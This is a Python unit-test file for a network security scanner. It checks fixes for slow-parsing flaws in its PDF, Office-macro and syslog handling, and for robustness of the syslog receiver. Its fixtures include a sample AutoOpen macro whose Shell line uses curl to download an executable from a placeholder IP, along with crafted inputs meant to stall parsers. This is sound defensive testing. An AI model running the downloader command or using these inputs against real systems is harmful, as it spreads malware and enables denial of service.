"""
Hostile input: fixes from the outside review of 2026-11-05 for file scans and
the syslog receiver (NetSentinel-review-2026-11-05.md, H8 and M2).

Each test fails on the code the review read. The timing tests use bounds far
above what the fixed code takes, so a slow CI runner does not flake them, and
far below what the old code took.
"""

import json
import os
import random
import re
import shutil
import sys
import tempfile
import threading
import time
import unittest
import zlib
from unittest import mock

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import _test_support  # noqa: E402,F401

from src import file_scan, script_rules, syslog_receiver  # noqa: E402
from test_scan_scripts import ovba_literal  # noqa: E402
from test_syslog_receiver import CEF, GATEWAY, T0, Settings  # noqa: E402

_OLD_PDF_STREAM = re.compile(rb'stream\r?\n(.*?)endstream', re.S)


def old_pdf_bodies(data):
    return [m.group(1) for m in _OLD_PDF_STREAM.finditer(data)]


class TestPdfStreams(unittest.TestCase):
    """H8: the stream regex was quadratic, and a search holds the GIL."""

    SAMPLES = [
        b'%PDF-1.4\n1 0 obj<</Length 5>>stream\nhello\nendstream\nendobj\n',
        b'%PDF-1.4\nstream\r\nwindows\r\nendstream\n',
        b'%PDF-1.4\nstreamNoNewline endstream stream\nafter\nendstream',
        b'%PDF-1.4\nstream\nA\nendstreamstream\nB\nendstream',              # back to back
        b'%PDF-1.4\nstream\nendstream',                                     # empty body
        b'%PDF-1.4\nstream\r\r\nnot a body endstream stream\nlast\nendstream',
        b'%PDF-1.4\nendstream\nlooks like a body\nendstream\n',             # 'stream' in 'endstream'
        b'%PDF-1.4\nstream\nopen with no end',
        b'%PDF-1.4\nstream\nfirst stream\nsecond endstream',
        b'',
    ]

    def test_the_same_bodies_as_the_regex(self):
        for sample in self.SAMPLES:
            with self.subTest(sample=sample[:40]):
                self.assertEqual(list(file_scan._iter_pdf_streams(sample)), old_pdf_bodies(sample))

    def test_the_same_bodies_as_the_regex_on_shuffled_pieces(self):
        pieces = [b'stream', b'endstream', b'\n', b'\r', b'\r\n', b'x', b'stre', b'am', b'end', b' ']
        rng = random.Random(20261105)
        for _ in range(3000):
            sample = b''.join(rng.choice(pieces) for _ in range(rng.randrange(1, 30)))
            self.assertEqual(list(file_scan._iter_pdf_streams(sample)), old_pdf_bodies(sample),
                             sample)

    def test_real_compressed_streams_still_inflate(self):
        body = zlib.compress(b'BT /F1 12 Tf (quarterly totals) Tj ET')
        data = (b'%PDF-1.4\n4 0 obj<</Filter/FlateDecode>>stream\r\n' + body +
                b'\r\nendstream\nendobj\n')
        self.assertIn('quarterly totals', ''.join(file_scan._pdf_streams(data, [])))

    def test_a_hostile_pdf_is_read_in_linear_time(self):
        # 'stream\n' over and over with no 'endstream': 64 KB took seconds, 256 KB minutes
        data = b'%PDF-1.4\n' + b'stream\n' * (256 * 1024 // 7)
        started = time.perf_counter()
        self.assertEqual(file_scan._pdf_streams(data, []), [])
        self.assertLess(time.perf_counter() - started, 1.0)

    def test_a_hostile_pdf_scan_finishes(self):
        data = b'%PDF-1.4\n' + b'stream\n' * (256 * 1024 // 7)
        started = time.perf_counter()
        file_scan.scan_bytes('invoice.pdf', data)
        self.assertLess(time.perf_counter() - started, 10.0)


# ─── Office macros ──────────────────────────────────────────────────────

def _old_ovba_decompress(data, start, limit):
    """script_rules.ovba_decompress as the review read it: the reference."""
    if data[start] != 1:
        raise ValueError('not a compressed container')
    out = bytearray()
    pos, n = start + 1, len(data)
    while pos + 2 <= n and len(out) < limit:
        header = data[pos] | (data[pos + 1] << 8)
        if (header >> 12) & 0x7 != 0b011:
            break
        chunk_end = min(n, pos + (header & 0x0FFF) + 3)
        pos += 2
        if not header & 0x8000:
            out += data[pos:pos + 4096]
            pos += 4096
            continue
        chunk_start = len(out)
        while pos < chunk_end:
            flags = data[pos]
            pos += 1
            for bit in range(8):
                if pos >= chunk_end:
                    break
                if not flags & (1 << bit):
                    out.append(data[pos])
                    pos += 1
                    continue
                if pos + 2 > chunk_end:
                    raise ValueError('truncated copy token')
                token = data[pos] | (data[pos + 1] << 8)
                pos += 2
                done = len(out) - chunk_start
                if done <= 0:
                    raise ValueError('copy token before any data')
                bits = min(max((done - 1).bit_length(), 4), 12)
                length = (token & (0xFFFF >> bits)) + 3
                offset = (token >> (16 - bits)) + 1
                src = len(out) - offset
                if src < chunk_start:
                    raise ValueError('copy token reaches before the chunk')
                for k in range(length):
                    out.append(out[src + k])
        pos = chunk_end
    return bytes(out[:limit])


def _old_vba_source(blob, limit=8 * 1024 * 1024, strings=True):
    parts, total, pos = [], 0, 0
    while total < limit:
        i = blob.find(b'\x00Attribut', pos)
        if i < 0:
            break
        pos = i + 9
        start = i - 3
        if start < 0 or blob[start] != 1:
            continue
        try:
            source = _old_ovba_decompress(blob, start, limit - total)
        except (ValueError, IndexError):
            continue
        if source:
            parts.append(source.decode('latin-1'))
            total += len(source)
    if strings:
        found = re.findall(rb'[\x20-\x7e]{6,}', blob[:limit])
        parts.append('\n'.join(s.decode('ascii') for s in found))
    return '\n'.join(parts)


def fake_openings(count):
    """
    Chunks that each end in 0x01, so every chunk header is preceded by what
    looks like a container's signature, and each opens with the flag byte and
    'Attribut'. The last chunk ends in a truncated copy token, so decoding
    from any of them reads to the end and fails.
    """
    out = bytearray(b'\x01')
    for _ in range(count):
        body = b'\x00Attribut\x00\x01'
        out += (0xB000 | (len(body) - 1)).to_bytes(2, 'little') + body
    body = b'\x00Attribut\x01\x05'
    out += (0xB000 | (len(body) - 1)).to_bytes(2, 'little') + body
    return bytes(out)


AUTO_OPEN = ('Attribute VB_Name = "ThisDocument"\r\nSub AutoOpen()\r\n'
             '  Shell "cmd /c curl -o %TEMP%\\p.exe http://198.51.100.20/p.exe"\r\nEnd Sub\r\n')
OLE = b'\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1'


def random_container(rng):
    out = bytearray(b'\x01')
    for _ in range(rng.randrange(1, 4)):
        if rng.random() < 0.1:
            out += (0x3FFF).to_bytes(2, 'little') + bytes(rng.randrange(256) for _ in range(4096))
            continue
        data = bytearray()
        for _ in range(rng.randrange(1, 40)):
            flags = rng.choice((0, 0, rng.randrange(256)))
            data.append(flags)
            for bit in range(8):
                if flags & (1 << bit):
                    data += rng.randrange(65536).to_bytes(2, 'little')
                else:
                    data.append(rng.randrange(97, 100))
        if rng.random() < 0.2:
            data = data[:rng.randrange(1, len(data) + 1)]       # a token cut short
        size = len(data) + 2 - 3 if rng.random() < 0.9 else rng.randrange(4096)
        out += (0xB000 | size).to_bytes(2, 'little') + data
    return bytes(out + bytes(rng.randrange(256) for _ in range(rng.randrange(4))))


def outcome(decompress, data, limit):
    try:
        return decompress(data, 0, limit)
    except ValueError:
        return 'malformed'


class TestMacroSource(unittest.TestCase):
    """vba_source restarted at every opening; a chain of fake ones made it quadratic."""

    def test_the_decoder_matches_the_old_one(self):
        rng = random.Random(51105)
        for _ in range(1500):
            data = random_container(rng)
            limit = rng.choice((5, 100, 1 << 20))
            self.assertEqual(outcome(script_rules.ovba_decompress, data, limit),
                             outcome(_old_ovba_decompress, data, limit), data[:60])

    def test_overlapping_copies(self):
        # 'abc', then 6 from 3 back; 'ab', then 7 from 1 back; and an exact-length copy
        cases = [(b'abc', 0x2003, b'abcabcabc'), (b'ab', 0x0004, b'abbbbbbbb'),
                 (b'abcd', 0x3001, b'abcdabcd')]
        for literals, token, expected in cases:
            flags = 1 << len(literals)
            body = bytes([flags]) + literals + token.to_bytes(2, 'little')
            data = b'\x01' + (0xB000 | (len(body) - 1)).to_bytes(2, 'little') + body
            with self.subTest(literals=literals):
                self.assertEqual(script_rules.ovba_decompress(data, 0, 1000), expected)
                self.assertEqual(_old_ovba_decompress(data, 0, 1000), expected)

    def test_ordinary_projects_read_as_before(self):
        module = ovba_literal(AUTO_OPEN.encode('latin-1'))
        other = ovba_literal(b'Attribute VB_Name = "Module1"\r\nFunction Total(a, b)\r\nEnd Function\r\n')
        big = ovba_literal(('Attribute VB_Name = "Big"\r\n' + "' a comment line\r\n" * 600)
                           .encode('latin-1'))
        blobs = [OLE + b'\x00' * 60 + module + b'\x00' * 30,
                 OLE + module + b'junk \x01\x02\x00Attribut junk' + other + b'\x00' * 10,
                 module + other + big,
                 b'\x00Attribut at the very start ' + module,
                 b'no macros here at all']
        for blob in blobs:
            for strings in (True, False):
                with self.subTest(blob=blob[:24], strings=strings):
                    self.assertEqual(script_rules.vba_source(blob, strings=strings),
                                     _old_vba_source(blob, strings=strings))

    def test_a_chain_of_fake_openings_is_read_once(self):
        blob = fake_openings(6000)          # about 78 KB; the old code took tens of seconds
        started = time.perf_counter()
        self.assertEqual(script_rules.vba_source(blob, strings=False), '')
        self.assertLess(time.perf_counter() - started, 2.0)

    def test_a_macro_after_decoys_is_still_found(self):
        notes = []
        blob = OLE + fake_openings(6000) + b'\x00' * 16 + ovba_literal(AUTO_OPEN.encode('latin-1'))
        source = script_rules.vba_source(blob, strings=False, notes=notes)
        self.assertIn('Sub AutoOpen()', source)
        self.assertEqual(notes, [])
        r = file_scan.scan_bytes('minutes.doc', blob)
        self.assertIn('macro_autoexec', {f['kind'] for f in r['findings']})

    def test_a_decoy_that_decodes_over_the_module_does_not_hide_it(self):
        # an uncompressed 4 KB chunk that opens like a module and swallows the real one
        module = ovba_literal(AUTO_OPEN.encode('latin-1'))
        decoy = b'\x01' + (0x3FFF).to_bytes(2, 'little') + b'\x00Attribute VB_Name = "Decoy"'
        blob = decoy + b'.' * 100 + module + b'.' * 4096
        self.assertIn('Sub AutoOpen()', script_rules.vba_source(blob, strings=False))

    def test_openings_that_fail_at_once_leave_work_for_the_module(self):
        # each claims a 4 KB chunk and fails 14 bytes in, at the next one's 0x01
        # read as a copy token: charged for the 4 KB, they would use up the work
        notes = []
        blob = b'\x01\xff\xbf\x00Attribut' * 20000 + ovba_literal(AUTO_OPEN.encode('latin-1'))
        started = time.perf_counter()
        source = script_rules.vba_source(blob, strings=False, notes=notes)
        self.assertLess(time.perf_counter() - started, 5.0)
        self.assertIn('Sub AutoOpen()', source)
        self.assertEqual(notes, [])

    def test_running_out_of_work_is_noted(self):
        notes = []
        blob = ovba_literal(AUTO_OPEN.encode('latin-1'))
        with mock.patch.object(script_rules, 'VBA_WORK_PER_BYTE', 0), \
                mock.patch.object(script_rules, 'VBA_WORK_FLOOR', 0):
            script_rules.vba_source(blob, strings=False, notes=notes)
        self.assertEqual(len(notes), 1)
        self.assertIn('work limit', notes[0])

    def test_reaching_the_size_limit_is_noted(self):
        notes = []
        source = 'Attribute VB_Name = "Big"\r\n' + "' a comment line\r\n" * 70000
        text = script_rules.vba_source(ovba_literal(source.encode('latin-1')), limit=1024 * 1024,
                                       strings=False, notes=notes)
        self.assertEqual(len(text), 1024 * 1024)
        self.assertEqual(notes, ['macro source past the first 1 MB was not read'])


# ─── Syslog ─────────────────────────────────────────────────────────────

_OLD_CEF_EXT = re.compile(r'(\w+)=((?:\\=|[^=])*?)(?=\s+\w+=|\s*$)')


def old_cef_extension(ext):
    return {k: v.replace('\\=', '=').replace('\\\\', '\\').strip()
            for k, v in _OLD_CEF_EXT.findall(ext)}


# The UniFi lines test_syslog_receiver reads, after the CEF header's seven fields.
UNIFI_LINES = [
    CEF,
    'Nov 02 17:22:17 HOME-UDM CEF:0|Ubiquiti|UniFi Network|10.6.109|544|Network Accessed|4|'
    'UNIFIcategory=Audit UNIFIhost=HOME UDM UNIFIaccessMethod=web UNIFIadmin=Sam Admin '
    'src=192.168.1.20 UNIFIutcTime=2026-11-02T22:22:17.796Z msg=Sam Admin accessed UniFi '
    'Network using the web. Source IP: 192.168.1.20',
    'Nov 02 17:32:34 HOME-UDM CEF:0|Ubiquiti|UniFi Network|10.6.109|203|Blocked by Firewall|4|'
    'UNIFIcategory=Security UNIFIhost=HOME UDM proto=TCP spt=50261 dpt=80 act=blocked app=HTTP '
    'UNIFIrisk=low UNIFIpolicyName=IOT TV to WAN UNIFIpolicyType=Firewall '
    'UNIFIdirection=outgoing deviceInboundInterface=Home IOT deviceOutboundInterface=Internet 1 '
    'dst=142.250.68.195 UNIFIsrcClientAlias=Living Room TV UNIFIsrcClientHostname=Samsung '
    'UNIFIsrcClientIp=192.168.1.45 UNIFIsrcClientMac=02:00:00:00:00:45 UNIFIsrcZone=Home IOT '
    'UNIFIdstZone=External UNIFIdstDomain=tv.example.com UNIFIfirewallPolicy=IOT TV to WAN '
    'UNIFIflowCount=1 msg=Living Room TV was blocked from accessing 142.250.68.195',
    'CEF:0|Ubiquiti|UniFi Network|10.6.109|1|Escapes|1|msg=a\\=b c\\\\d  dst=198.51.100.7   ',
]


def extension(line):
    return re.split(r'(?<!\\)\|', line[line.index('CEF:'):].partition('|')[2], maxsplit=6)[6]


class TestCefExtension(unittest.TestCase):
    """M2: the CEF extension regex was quadratic on whitespace, holding the GIL."""

    def test_unifi_lines_read_as_before(self):
        for line in UNIFI_LINES:
            with self.subTest(line=line[-40:]):
                ext = extension(line)
                self.assertEqual(syslog_receiver._cef_extension(ext), old_cef_extension(ext))

    def test_an_equals_sign_inside_a_value_stays_in_it(self):
        # the old parser dropped request and made up a key c
        fields = syslog_receiver._cef_extension('request=http://x/?a=b&c=1 src=192.168.1.40')
        self.assertEqual(fields, {'request': 'http://x/?a=b&c=1', 'src': '192.168.1.40'})
        r = syslog_receiver.parse('CEF:0|Ubiquiti|UniFi Network|10.6.109|1|Blocked|4|'
                                  'msg=blocked http://x/?a=b&c=1 src=192.168.1.40 dst=198.51.100.7')
        self.assertEqual((r['message'], r['src'], r['dst']),
                         ('blocked http://x/?a=b&c=1', '192.168.1.40', '198.51.100.7'))

    def test_whitespace_runs_are_read_in_linear_time(self):
        line = 'CEF:0|Ubiquiti|UniFi Network|10.6.109|1|E|1|key=' + ' \t' * 4060 + 'x'
        self.assertLessEqual(len(line), syslog_receiver.MAX_MESSAGE)
        started = time.perf_counter()
        for _ in range(5):
            syslog_receiver.parse(line)
        self.assertLess(time.perf_counter() - started, 1.0)


def day_of(when):
    return time.strftime('%Y-%m-%d', time.localtime(when))


class _SyslogCase(unittest.TestCase):

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix='ns_syslog_review_')
        self.addCleanup(shutil.rmtree, self.tmp, True)

    def receiver(self, **settings):
        r = syslog_receiver.SyslogReceiver(Settings(**settings), data_dir=self.tmp,
                                           clock=lambda: T0)
        self.addCleanup(r.stop)
        return r

    def write_day(self, r, day, size):
        with open(r.day_path(day), 'wb') as f:
            f.write(b'x' * (size - 1) + b'\n')

    def flood(self, r, count):
        # one a second, so the rate cap is not what drops them
        for i in range(count):
            r.handle(f'{CEF} msg=record {i}'.encode(), GATEWAY, now=T0 + i)

    def lines(self, r, day):
        with open(r.day_path(day), encoding='utf-8') as f:
            return [json.loads(line) for line in f]


class TestSyslogDayCap(_SyslogCase):
    """M2: today's file had no cap, and pruning made room for it by deleting every other day."""

    def test_todays_file_stays_within_its_share(self):
        r = self.receiver(max_mb=1)
        self.flood(r, 3000)
        today = day_of(T0)
        self.assertLessEqual(os.path.getsize(r.day_path(today)), r.day_cap)
        self.assertEqual(r.day_cap, 512 * 1024)
        kept = [int(rec['message'].split()[-1]) for rec in self.lines(r, today)]
        # the newest are kept, in order, and every record is either kept or counted
        self.assertEqual(kept, list(range(3000 - len(kept), 3000)))
        self.assertGreater(r.dropped_cap, 0)
        self.assertEqual(r.dropped_cap + len(kept), 3000)
        status = r.status()
        self.assertEqual(status['dropped_cap'], r.dropped_cap)
        self.assertIn(f"{r.dropped_cap} of the day's oldest dropped", status['note'])

    def test_a_flood_today_leaves_the_other_days(self):
        r = self.receiver(max_mb=1, keep_days=30)
        older = [day_of(T0 - n * 86400) for n in (3, 2, 1)]
        for day in older:
            self.write_day(r, day, 100_000)
        self.flood(r, 3000)
        r.prune(now=T0)
        self.assertEqual(r.days(), older + [day_of(T0)])

    def test_today_is_the_clocks_date_not_the_newest_name(self):
        # the clock stepped back: a later day's file exists, and today's must survive
        r = self.receiver(max_mb=1, keep_days=30)
        today, later = day_of(T0), day_of(T0 + 60 * 86400)
        self.write_day(r, today, 400_000)
        self.write_day(r, later, 700_000)
        r.prune(now=T0)
        self.assertEqual(r.days(), [today])

    def test_older_days_go_when_the_total_with_today_is_over(self):
        r = self.receiver(max_mb=1, keep_days=30)
        old, older = day_of(T0 - 86400), day_of(T0 - 2 * 86400)
        self.write_day(r, older, 300_000)
        self.write_day(r, old, 300_000)
        self.write_day(r, day_of(T0), 500_000)
        r.prune(now=T0)
        self.assertEqual(r.days(), [old, day_of(T0)])

    def test_dropping_the_oldest_keeps_whole_records(self):
        path = os.path.join(self.tmp, 'day.jsonl')
        records = [json.dumps({'n': i, 'pad': 'p' * (i % 37)}) + '\n' for i in range(500)]
        with open(path, 'w', encoding='utf-8', newline='') as f:
            f.writelines(records)
        dropped, left = syslog_receiver._drop_oldest(path, 6000)
        with open(path, encoding='utf-8') as f:
            kept = f.readlines()
        self.assertEqual(kept, records[dropped:])
        self.assertEqual(left, os.path.getsize(path))
        self.assertLessEqual(left, 6000)
        self.assertGreater(left, 6000 - len(max(records, key=len)))


class FakeSocket:
    """recvfrom hands out the datagrams, then stops the receiver; nothing is opened."""

    def __init__(self, receiver, datagrams, then=TimeoutError):
        self.receiver, self.datagrams, self.then = receiver, list(datagrams), then

    def recvfrom(self, size):
        if self.datagrams:
            return self.datagrams.pop(0), (GATEWAY, 514)
        if self.then is TimeoutError:
            self.receiver._stop.set()
        raise self.then('socket gave up')

    def close(self):
        pass


SECRET_WORDS = 'Unnamed-Synth-4417'


class TestSyslogLoop(_SyslogCase):
    """M2: an exception from one message ended the receiver, which went on saying 'waiting'."""

    def choke_on(self, word):
        real = syslog_receiver.parse

        def parse(text):
            if word in text:
                raise KeyError(f'cannot read {text}')
            return real(text)
        return mock.patch.object(syslog_receiver, 'parse', parse)

    def test_a_message_that_raises_is_skipped_and_the_next_read(self):
        r = self.receiver()
        bad = f'{CEF} msg={SECRET_WORDS}'.encode()
        r._sock = FakeSocket(r, [bad, bad, CEF.encode()])
        with self.choke_on(SECRET_WORDS), self.assertLogs('NetSentinel.Syslog', 'WARNING') as logs:
            r._loop()
        self.assertEqual((r.received, r.unreadable), (1, 2))
        self.assertEqual(len(logs.records), 1)              # rate-limited
        self.assertNotIn(SECRET_WORDS, '\n'.join(logs.output))
        self.assertIn('KeyError', logs.output[0])
        self.assertIn('2 could not be read', r.status()['note'])

    def test_a_dead_receiver_is_reported_failed(self):
        r = self.receiver()
        r._sock = FakeSocket(r, [], then=ValueError)
        with self.assertLogs('NetSentinel.Syslog', 'ERROR'):
            r._thread = threading.Thread(target=r._loop)
            r._thread.start()
            r._thread.join(5)
        status = r.status()
        self.assertEqual(status['state'], 'failed')
        self.assertIn('ValueError', status['note'])

    def test_a_thread_that_ended_is_failed_not_waiting(self):
        r = self.receiver()
        r._thread = threading.Thread(target=lambda: None)
        r._thread.start()
        r._thread.join(5)
        self.assertEqual(r.status()['state'], 'failed')
        r.stop()
        self.assertEqual(r.status()['state'], 'waiting')     # stopped on purpose


class TestSyslogNumbers(_SyslogCase):
    """M3 for syslog: a typo in a number setting stopped NetSentinel starting."""

    def test_typos_fall_back_to_the_defaults(self):
        for enabled in (False, True):
            with self.subTest(enabled=enabled), mock.patch('src.config.logger'):
                r = self.receiver(enabled=enabled, port='55l4', keep_days='30d', max_mb='lots')
                self.assertEqual((r.port, r.keep_days, r.max_bytes),
                                 (5514, 30, 500 * 1024 * 1024))

    def test_numbers_typed_as_text_are_read(self):
        r = self.receiver(port=' 5515 ', keep_days='7', max_mb='2')
        self.assertEqual((r.port, r.keep_days, r.max_bytes), (5515, 7, 2 * 1024 * 1024))

    def test_the_port_is_kept_in_range(self):
        # 70000 raised OverflowError from bind(), which start() did not catch
        for typed, port in ((70000, 65535), (-3, 1), (0, 5514), ('', 5514)):
            # as_int warns about a value out of range, once a value; expected here
            with self.subTest(typed=typed), mock.patch('src.config.logger'):
                self.assertEqual(self.receiver(port=typed).port, port)

    def test_an_address_that_cannot_be_a_host_name_does_not_raise(self):
        # non-ASCII, so it fails in the IDNA encoding before any lookup is tried
        r = self.receiver(bind='é' * 70)
        with self.assertLogs('NetSentinel.Syslog', 'WARNING'):
            self.assertFalse(r.start())
        self.assertEqual(r.status()['state'], 'failed')


if __name__ == '__main__':
    unittest.main()
